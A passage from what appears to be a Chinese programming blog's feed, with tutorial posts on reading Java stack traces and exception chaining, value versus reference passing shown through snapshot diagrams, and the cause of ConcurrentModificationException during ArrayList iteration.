class="string">&quot; more&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Print suppressed exceptions, if any</span></span><br><span class="line">        <span class="keyword">for</span> (Throwable se : getSuppressed())</span><br><span class="line">            se.printEnclosedStackTrace(s, trace, SUPPRESSED_CAPTION,</span><br><span class="line">                                       prefix +<span class="string">&quot;\t&quot;</span>, dejaVu);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Print cause, if any</span></span><br><span class="line">        Throwable ourCause = getCause();</span><br><span class="line">        <span class="keyword">if</span> (ourCause != <span class="keyword">null</span>)</span><br><span class="line">            ourCause.printEnclosedStackTrace(s, trace, CAUSE_CAPTION, prefix, dejaVu);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="信息中的…-n-more是怎么来的"><a href="#信息中的…-n-more是怎么来的" class="headerlink" title="信息中的… n more是怎么来的"></a>信息中的… n more是怎么来的</h2><p>原文：参考资料3</p><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestEx</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">fun1</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">&quot;level 1 exception&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">fun2</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fun1();</span><br><span class="line">            System.out.println(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">&quot;level 2 exception&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">fun3</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fun2();</span><br><span class="line">            System.out.println(<span class="string">&quot;3&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;level 3 exception&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">new</span> TestEx().fun3();</span><br><span class="line">            System.out.println(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Connected to the target VM, address: &#x27;127.0.0.1:57353&#x27;, transport: &#x27;socket&#x27;</span><br><span class="line">java.lang.RuntimeException: level 3 exception</span><br><span class="line">  at person.ismallboy.console.TestEx.fun3(TestEx.java:24)</span><br><span class="line">  at person.ismallboy.console.TestEx.main(TestEx.java:30)</span><br><span class="line">Caused by: java.io.IOException: level 2 exception</span><br><span class="line">  at person.ismallboy.console.TestEx.fun2(TestEx.java:15)</span><br><span class="line">  at person.ismallboy.console.TestEx.fun3(TestEx.java:21)</span><br><span class="line">  ... 1 more</span><br><span class="line">Caused by: java.io.IOException: level 1 exception</span><br><span class="line">  at person.ismallboy.console.TestEx.fun1(TestEx.java:7)</span><br><span class="line">  at person.ismallboy.console.TestEx.fun2(TestEx.java:12)</span><br><span class="line">  ... 2 more</span><br><span class="line">Disconnected from the target VM, address: &#x27;127.0.0.1:57353&#x27;, transport: &#x27;socket&#x27;</span><br></pre></td></tr></table></figure><p>printEnclosedStackTrace函数其实是一个回调输出堆栈的过程。隐藏部分堆栈，是为了提高性能，省略一些不必要的输出，输出的内容越多，io耗时越慢。</p><blockquote><p>The trace ends with an “… N more” which indicates that the last N frames are the same as for the previous exception.</p></blockquote><p>其实“… n more”的部分是重复的堆栈部分。我们分析一下上面这个函数“printEnclosedStackTrace”，翻译为“打印封闭堆栈跟踪信息”，“封闭”暂且可以理解为“完整的”，这个函数有两个比较重要的变量，分别是“enclosingTrace”和“trace ”，这两个参数是什么关系呢？其实可以简单理解为“enclosingTrace”是“trace ”的父级堆栈，函数printEnclosedStackTrace中的while循环，就是为倒序找出“enclosingTrace”和“trace ”中从哪一个栈帧开始就不一样了，即“enclosingTrace”和“trace ”是有一部分是一样的（从数组后面倒回来），就是为了算出有多少个栈帧信息是重复可以隐藏的，相同的栈帧就不用重复输出了。</p><p>每个异常都输出一个完整的堆栈信息的话，都是从main函数开始，到当前的函数的所有函数调用的栈帧信息，里面函数的调用栈帧信息都会包括外层的函数调用栈帧信息，所以都输出的话，很多都是重复的，为了提高效率，减少io以及输出的内容太多又杂乱，所以jvm以“… n more”的方式隐藏了重复的部分。</p><p>当然，如果想不隐藏，可以重写java.lang.Throwable#printEnclosedStackTrace，去掉while部分，就可以看到每个异常的完整堆栈信息了，可以参考<a href="https://blog.csdn.net/michaelehome/article/details/79484722%E6%9D%A5%E9%AA%8C%E8%AF%81%E3%80%82">https://blog.csdn.net/michaelehome/article/details/79484722来验证。</a></p><h1 id="Exception-chaining：cause"><a href="#Exception-chaining：cause" class="headerlink" title="Exception chaining：cause"></a>Exception chaining：cause</h1><h2 id="工程中的最佳实践：捕捉并抛出一个更加贴合实际的Exception"><a href="#工程中的最佳实践：捕捉并抛出一个更加贴合实际的Exception" class="headerlink" title="工程中的最佳实践：捕捉并抛出一个更加贴合实际的Exception"></a>工程中的最佳实践：捕捉并抛出一个更加贴合实际的Exception</h2><p>原文：参考资料4、6</p><p>Let’s say we are working on a big project that deals with fictional <code>FooBars</code>, and our code is going to be used by others. We might decide to catch the ArithmeticException from <code>Fraction</code> and re-throw it as something project-specific, which looks like this:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">         ....</span><br><span class="line">        Fraction.getFraction(x,y);</span><br><span class="line">         ....</span><br><span class="line">&#125; <span class="keyword">catch</span> ( ArithmeticException e )&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MyProjectFooBarException(<span class="string">&quot;The number of FooBars cannot be zero&quot;</span>, e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Catching the <code>ArithmeticException</code> and rethrowing it has a few benefits:</p><ul><li>Our users are shielded from having to care about the <code>ArithmeticException</code> - giving us flexibility to change how commons-lang is used.</li><li>More context can be added, eg stating that it’s <em>the number of FooBars</em> that is causing the problem.</li><li>It can make stack traces easier to read, too, as we’ll see below.</li></ul><p>It isn’t necessary to catch-and-rethrow on <em>every</em> Exception, but where there seems to be a jump in the layers of your code, like calling into a library, it often makes sense.</p><p>注意到MyProjectFooBarException的构造器有两个参数，第二个就是cause，用来指明产生此异常的根异常。</p><p>Every Exception in Java has a <code>cause</code> field, and when doing a <em>catch-and-rethrow</em> like this then you should <em>always</em> set that to help people debug errors.</p><p>设置了cause后stack trace变成了这样：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.myproject.module.MyProjectFooBarException: The number of FooBars cannot be zero</span><br><span class="line">    at com.myproject.module.MyProject.anotherMethod(MyProject.java:19)</span><br><span class="line">    at com.myproject.module.MyProject.someMethod(MyProject.java:12)</span><br><span class="line">    at com.myproject.module.MyProject.main(MyProject.java:8)</span><br><span class="line">Caused by: java.lang.ArithmeticException: The denominator must not be zero</span><br><span class="line">    at org.apache.commons.lang3.math.Fraction.getFraction(Fraction.java:143)</span><br><span class="line">    at com.myproject.module.MyProject.anotherMethod(MyProject.java:17)</span><br><span class="line">    ... 2 more</span><br></pre></td></tr></table></figure><p>多了一行<code>Caused by：</code>和cause的栈信息。需要注意的是此时若要查看异常根源，需要找到最后的caused by后面的异常的第一个方法。</p><blockquote><p>The “Caused by:” is only included in the output when the primary exception’s <code>cause</code> is not <code>null</code>). Exceptions can be chained indefinitely, and in that case the stacktrace can have multiple “Caused by:” traces.</p></blockquote><p>SO, don’t handle exceptions in the intermediate layers, because code in the middle layers is often used by code in the higher layers. It’s responsibility of the code in the top-most layer to handle the exceptions. The top-most layer is typically the user interface such as command-line console, window or webpage. And typically we handle exceptions by showing a warning/error message to the user.</p><p>This good practice is illustrated by the following picture:</p><p><img src="/2021/how-to-read-and-use-stack-trace/exception_chaining_rule.png" alt="exception chaining rule"></p><p><img src="https://www.codejava.net/images/articles/javacore/exception/stacktrace/exception_chaining_rule.png" alt="exception chaining rule"></p><h1 id="stack-trace中类、方法名的表示的特殊情况"><a href="#stack-trace中类、方法名的表示的特殊情况" class="headerlink" title="stack trace中类、方法名的表示的特殊情况"></a>stack trace中类、方法名的表示的特殊情况</h1><p>The class and method names in the stack frames are the internal names for the classes and methods. You will need to recognize the following unusual cases:</p><ul><li>A nested or inner class will look like “OuterClass$InnerClass”.</li><li>An anonymous inner class will look like “OuterClass$1”, “OuterClass$2”, etcetera.</li><li>When code in a constructor, instance field initializer or an instance initializer block is being executed, the method name will be “”.</li><li>When code in a static field initializer or static initializer block is being executed, the method name will be “”.</li></ul><h1 id="将-stack-trace-转为String"><a href="#将-stack-trace-转为String" class="headerlink" title="将 stack trace 转为String"></a>将 stack trace 转为String</h1><p>有时候我们需要将栈信息转换为String以便后面的操作，通常的做法是 create a temporary <code>OutputStream</code> or <code>Writer</code> that writes to an in-memory buffer and pass that to the <code>printStackTrace(...)</code>.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the string representation of the stack trace.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> throwable the throwable</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the string.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">stackTraceToString</span><span class="params">(Throwable throwable)</span> </span>&#123;</span><br><span class="line">    StringWriter stringWriter = <span class="keyword">new</span> StringWriter();</span><br><span class="line">    throwable.printStackTrace(<span class="keyword">new</span> PrintWriter(stringWriter));</span><br><span class="line">    <span class="keyword">return</span> stringWriter.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <a href="http://commons.apache.org/proper/commons-lang/javadocs/api-2.6/org/apache/commons/lang/exception/ExceptionUtils.html#getStackTrace(java.lang.Throwable)">Apache Commons</a> 和 <a href="http://google.github.io/guava/releases/snapshot/api/docs/com/google/common/base/Throwables.html#getStackTraceAsString(java.lang.Throwable)">Guava</a> 都提供有进行这个操作的工具方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.lang.exception.ExceptionUtils.getStackTrace(Throwable)</span><br><span class="line">com.google.common.base.Throwables.getStackTraceAsString(Throwable)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文详细总结了stack trace的各个部分的含义和使用方法，同时深入介绍了一些与异常相关的函数和最佳实践。&lt;/p&gt;</summary>
    
    
    
    <category term="SoftwareConstruction" scheme="https://www.fvolcano.red/categories/SoftwareConstruction/"/>
    
    
  </entry>
  
  <entry>
    <title>通过snapshot图理解值与引用</title>
    <link href="https://www.fvolcano.red/2021/how-to-use-snapshot/"/>
    <id>https://www.fvolcano.red/2021/how-to-use-snapshot/</id>
    <published>2021-07-07T12:23:08.000Z</published>
    <updated>2021-07-07T12:23:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>Java中的值与引用的概念是初学时的一个易错点，本文总结了二者的概念出现场景，并使用snapshot图来帮助加深理解。<a id="more"></a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://www.cnblogs.com/weidagang2046/archive/2010/07/24/value-vs-ref.html">理解值与引用</a></li><li><a href="https://www.cnblogs.com/PasserByOne/p/12296649.html">值和引用</a></li><li><a href="https://blog.csdn.net/zzp_403184692/article/details/8184751#">Java：按值传递还是按引用传递详细解说</a></li><li><a href="https://blog.csdn.net/xx123698/article/details/99683909">让你彻底理解Java的值传递和引用传递</a></li><li><a href="https://blog.csdn.net/qq_28849009/article/details/107155420">软件构造（四点五）Snapshot图的最全画法、符号原理详解（内附纯手绘图片以及详细代码、例子）</a></li><li><a href="https://blog.csdn.net/wxc1172300310/article/details/92849187">Snapshot Diagram画法小结</a></li></ol><h1 id="值与引用"><a href="#值与引用" class="headerlink" title="值与引用"></a>值与引用</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>“面向对象分析和设计需要区分对象的值语义与引用语义。我的一块钱和你的一块钱相等，这是值语义；20岁的我和30岁的我是同一个人，这是引用语义。值对象包括2大特征：内容和运算，比如：3这个整数在计算机内部用二进制11表示，可以参与+,-,*,/等运算；引用对象包括3大特征：标识、状态和行为，比如：Person对象拥有不变的标识，并可通过行为改变状态。值对象的同一性建立在内容的基础上，而引用对象的同一性建立在标识的基础上。</p><p>struct和class是OOP语言为分别表达值语义和引用语义所提供的语法机制。值对象只能被动地参与运算，引用对象拥有主动的行为。”</p><p>简而言之，在类和对象的层面，引用可以看成是地址，而值就是这个地址上的内容。</p><h2 id="Java中的值传递与引用传递"><a href="#Java中的值传递与引用传递" class="headerlink" title="Java中的值传递与引用传递"></a>Java中的值传递与引用传递</h2><p>赋值和参数传递可以通过值复制(value-copy)或者引用复制 (reference-copy)来完成，在不同的编程语言中有不同的实现方法。</p><p>例如，在C中若要传递一个变量给一个函数并在函数中修改，可以传递这个变量的地址，即一个指向它的指针；在 C++ 中，就可以这样来声明参数int&amp; myNum，即如果传递的变量是x，myNum就是指向x的引用，引用就像一种特殊的指针。</p><p>Java 中没有指针，有按值传递和按引用传递。</p><p>首先最好理解Java的内存分配模型，参考另一篇：<a href="https://blog.csdn.net/xx123698/article/details/99683909">https://blog.csdn.net/xx123698/article/details/99683909</a></p><h2 id="按值传递"><a href="#按值传递" class="headerlink" title="按值传递"></a>按值传递</h2><p>当传递的内容是基本类型时，Java传递的是该变量值的副本，可以理解为是重新创建了一个相同类型的变量，将传过去的参数的值赋给这个新的变量，函数内部使用的是这个新的局部变量。</p><p>描述的就是下面这两个概念：</p><ol><li>形参：方法被调用时需要传递进来的参数，如：func(int a)中的a，它只有在func被调用期间a才有意义，也就是会被分配内存空间，在方法func执行完成后，a就会被销毁释放空间，也就是不存在了。</li><li>实参：方法被调用时是传入的实际值，它在方法被调用前就已经被初始化并且在方法被调用时传入。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PassTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;   <span class="comment">// 这个a与外面的a不是同一个了，可以改名：int b</span></span><br><span class="line">        a = <span class="number">5</span>;       <span class="comment">// 修改的是函数内部局部变量a的值，与main中的a无关</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        PassTest t = <span class="keyword">new</span> PassTest();</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">3</span>;</span><br><span class="line">        t.test(a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="按引用传递"><a href="#按引用传递" class="headerlink" title="按引用传递"></a>按引用传递</h2><p>当传递对象、数组时，Java同样传递的是副本，不同的是，是引用的副本，即创建了一个新的局部变量，将原来的引用的内容复制到了这个变量内，可以理解为把原来引用代表的地址值赋给这个新的变量，可以通过这个地址改变地址上的内容，但若改变这个局部变量的内容，让它“引用”其他的东西，原来外部的引用不会改变。</p><p>其实与C中的传递指针类似：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(struct student *s)</span> </span>&#123;</span><br><span class="line">    s-&gt;age = <span class="number">18</span>;    <span class="comment">// 实参也改变</span></span><br><span class="line">    s = &#123;<span class="number">20</span>,...&#125;    <span class="comment">// 实参不变</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TempTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">(A a)</span></span>&#123;</span><br><span class="line">        a.age = <span class="number">20</span>;          <span class="comment">// 修改了外面a的内容</span></span><br><span class="line">        a = <span class="keyword">new</span> A();         <span class="comment">// 已经指向不同内容了</span></span><br><span class="line">        a.age = <span class="number">18</span>;          <span class="comment">// 没有修改外部内容</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        TempTest t = <span class="keyword">new</span> TempTest();</span><br><span class="line">        A a = <span class="keyword">new</span> A();</span><br><span class="line">        a.age = <span class="number">10</span>;</span><br><span class="line">        t.test1(a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>说法：“在Java里面参数传递都是按值传递”</p><p>这句话的意思是：按值传递是传递的值的拷贝，按引用传递其实传递的是引用的拷贝，所以统称按值传递。</p></blockquote><h1 id="Snapshot-diagram"><a href="#Snapshot-diagram" class="headerlink" title="Snapshot diagram"></a>Snapshot diagram</h1><p>理解内存是如何分配的能够帮助理解程序中的值和引用。在snapshot图中，箭头代表的是引用，圆圈/箭头指向的内容代表的是值。</p><h2 id="画法"><a href="#画法" class="headerlink" title="画法"></a>画法</h2><p>原文：参考资料6</p><p>对于基本类型的值，使用单线箭头指向实际值，不需要表明数据类型。</p><img src="/2021/how-to-use-snapshot/20190619221541539.png" style="zoom:75%;"><p>对于对象的值，如果是可变对象，使用单线椭圆，椭圆内写明对象的类型及对象内的值。</p><p><img src="/2021/how-to-use-snapshot/20190619221635544.png"></p><p>如果是不可变对象，使用双线椭圆，椭圆内写明对象的类型及对象内的值。</p><p><img src="/2021/how-to-use-snapshot/20190619221821332.png"></p><p>如果是对象的不可变引用（final标记），使用双线箭头。eg：id<br>如果是对象的可变引用，使用单线箭头。eg：age</p><p><img src="/2021/how-to-use-snapshot/image-20210707212724115.png"></p><h2 id="相关面试题"><a href="#相关面试题" class="headerlink" title="相关面试题"></a>相关面试题</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">operate</span><span class="params">(StringBuffer x, StringBuffer y)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        x.append(y);</span><br><span class="line">        y = x;</span><br><span class="line">        System.out.println(x + <span class="string">&quot;,&quot;</span> + y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        StringBuffer a = <span class="keyword">new</span> StringBuffer(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">        StringBuffer b = <span class="keyword">new</span> StringBuffer(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">        operate(a, b);</span><br><span class="line">        System.out.println(a + <span class="string">&quot;,&quot;</span> + b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">AB,AB</span><br><span class="line">AB,B</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;Java中的值与引用的概念是初学时的一个易错点，本文总结了二者的概念出现场景，并使用snapshot图来帮助加深理解。&lt;/p&gt;</summary>
    
    
    
    <category term="SoftwareConstruction" scheme="https://www.fvolcano.red/categories/SoftwareConstruction/"/>
    
    
  </entry>
  
  <entry>
    <title>ConcurrentModifyException并发修改异常是怎么回事？</title>
    <link href="https://www.fvolcano.red/2021/What-caused-ConcurrentModifyException/"/>
    <id>https://www.fvolcano.red/2021/What-caused-ConcurrentModifyException/</id>
    <published>2021-07-07T06:35:53.000Z</published>
    <updated>2021-07-07T06:35:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>在遍历集合类的元素时，若试图修改该集合则会报ConcurrentModifyException异常，本文介绍了该异常产生的各种情况、原因和解决方案。<img src="/2021/What-caused-ConcurrentModifyException/image-20210707144719236-1625640442274.png" alt="image-20210707144719236"><a id="more"></a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://www.cnblogs.com/bsjl/p/7676209.html">Java并发–ConcurrentModificationException（并发修改异常）异常原因和解决方法</a></li><li><a href="https://blog.csdn.net/sinbadfreedom/article/details/80467328">ConcurrentModifyException的产生原因及如何避免</a></li><li><a href="https://zhuanlan.zhihu.com/p/38823394">并发进阶（四）并发修改异常</a></li></ol><h1 id="ConcurrentModifyException是什么"><a href="#ConcurrentModifyException是什么" class="headerlink" title="ConcurrentModifyException是什么"></a>ConcurrentModifyException是什么</h1><p>原文：参考资料2</p><p>ConcurrentModificationException这个异常是从JDK1.2时就存在。当方法检测到对象的并发修改，但不允许这种修改时，抛出此异常。这个异常在单线程和多线程运行环境都可以产生。</p><p>某个线程在 Collection 上进行迭代时，通常不允许另一个线性修改该Collection。通常在这些情况下，迭代的结果是不确定的。如果检测到这种行为，一些迭代器实现（包括JRE提供的所有通用collection实现）可能选择抛出此异常。</p><p>执行该操作的迭代器称为快速失败迭代器，因为迭代器很快就完全失败，而不会冒着在将来某个时间任意发生不确定行为的风险。迭代器的快速失败行为无法得到保证，因为一般来说，不可能对是否出现不同步并发修改做出任何硬性保证。快速失败操作会尽最大努力抛出ConcurrentModificationException。</p><p>因此，为提高此类操作的正确性而编写一个依赖于此异常的程序是错误的做法，正确做法是：ConcurrentModificationException 应该仅用于检测 bug。</p><h1 id="1-使用迭代器遍历时修改"><a href="#1-使用迭代器遍历时修改" class="headerlink" title="1 使用迭代器遍历时修改"></a>1 使用迭代器遍历时修改</h1><h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line"><span class="comment">// ...(向list进行添加等相关操作)</span></span><br><span class="line"><span class="comment">// 需求：删除list中的2</span></span><br><span class="line">Iterator&lt;Integer&gt; iterator = list.iterator();</span><br><span class="line"><span class="keyword">while</span>(iterator.hasNext())&#123;</span><br><span class="line">    Integer integer = iterator.next();</span><br><span class="line">    <span class="keyword">if</span>(integer==<span class="number">2</span>)</span><br><span class="line">        list.remove(integer);  <span class="comment">// 报错</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>查看ArrayList的源码，发现并没有iterator()方法的实现，那么说明它继承了其父类AbstractList的该方法。查看：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Iterator&lt;E&gt; <span class="title">iterator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Itr();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回一个Itr类型的对象，继续查看该类的实现,是一个私有的内部类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Itr</span> <span class="keyword">implements</span> <span class="title">Iterator</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cursor = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> lastRet = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> expectedModCount = modCount;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cursor != size();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">next</span><span class="params">()</span> 